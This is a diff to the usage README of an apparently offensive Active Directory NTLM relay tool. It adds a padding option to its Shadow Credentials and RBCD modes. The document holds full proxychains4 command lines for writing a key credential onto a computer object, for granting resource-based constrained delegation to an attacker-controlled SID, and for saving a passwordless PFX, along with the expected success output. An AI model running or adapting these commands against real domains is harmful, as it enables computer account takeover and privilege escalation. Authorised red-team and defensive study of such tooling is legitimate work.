@@ -90,6 +90,7 @@ proxychains4 python3 relay_server.py shadowcred \
   --ldap-host DC01.example.test --ldap-address 10.0.0.11 \
   --domain example.test --machine WORKSTATION \
   --target-dn 'CN=WORKSTATION,OU=Workstations,DC=example,DC=test' \
+  --padding-count 2 \
   --pfx-out 'shadow-{request_id}.pfx'
 ```
 
@@ -107,10 +108,11 @@ Expected success:
 [+] Saved passwordless shadow credential PKCS#12 to shadow-<ID>.pfx
 [+] Shadow Credential DeviceId: <GUID>
 [+] Shadow Credential KeyId: <SHA256 key identifier>
+[+] Shadow Credential key pair acquired (shadow-<ID>)
 [+] Shadow Credentials relay completed
 ```
 
-Success requires result `0` for both the final LDAP bind and queued ModifyResponse. `--target-dn` identifies the exact computer object, including its OU. The script will not overwrite an existing NGC Shadow Credential value.
+Success requires result `0` for the final LDAP bind and at least one queued ModifyResponse. `--target-dn` identifies the exact computer object, including its OU. ShadowCred defaults to two identical KCL candidates (`--padding-count 2`) to give the final bind time to complete. Set it to `1` for the single-write, no-extra-padding baseline; higher values increase the padding when needed. Because each candidate contains the same DN-Binary value, successful padding does not create multiple separate Key Credential entries. The script will not overwrite an existing NGC Shadow Credential value.
 
 ## RBCD usage
 
@@ -124,7 +126,8 @@ proxychains4 python3 relay_server.py rbcd \
   --domain example.test --machine WORKSTATION \
   --target-dn 'CN=WORKSTATION,OU=Workstations,DC=example,DC=test' \
   --delegate-account CONTROLLED$ \
-  --delegate-sid 'S-1-5-21-111111111-222222222-333333333-1234'
+  --delegate-sid 'S-1-5-21-111111111-222222222-333333333-1234' \
+  --padding-count 8
 ```
 
 Then run:
@@ -141,7 +144,7 @@ Expected success:
 [+] RBCD relay completed
 ```
 
-This replaces `msDS-AllowedToActOnBehalfOfOtherIdentity` with a descriptor containing the supplied SID. The final S4U/ticket sequence is left to the operator.
+This replaces `msDS-AllowedToActOnBehalfOfOtherIdentity` with a descriptor containing repeated identical ACEs for the supplied SID. `--padding-count` controls the ACE count and defaults to `8`; set it to `1` for no extra ACE padding. The final S4U/ticket sequence is left to the operator.
 
 ## BOF success output
 
